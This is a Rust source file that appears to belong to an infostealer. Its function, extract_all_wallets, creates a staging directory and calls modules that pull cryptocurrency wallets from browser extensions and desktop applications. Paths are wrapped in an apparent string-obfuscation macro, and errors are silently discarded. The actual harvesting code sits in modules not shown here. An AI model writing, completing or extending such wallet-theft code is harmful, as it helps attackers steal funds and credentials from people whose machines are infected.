use crate::sprotect;
use std::fs;
use std::path::PathBuf;

pub async fn extract_all_wallets() -> Result<(), Box<dyn std::error::Error>> {
    let output_dir = sprotect!("C:\\temp\\extract\\wallets");
    fs::create_dir_all(&output_dir)?;
    
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
    }

    crate::wallet::browser_extensions::extract_browser_wallets().await.ok();
    crate::wallet::desktop_apps::extract_desktop_wallets().await.ok();

    Ok(())
}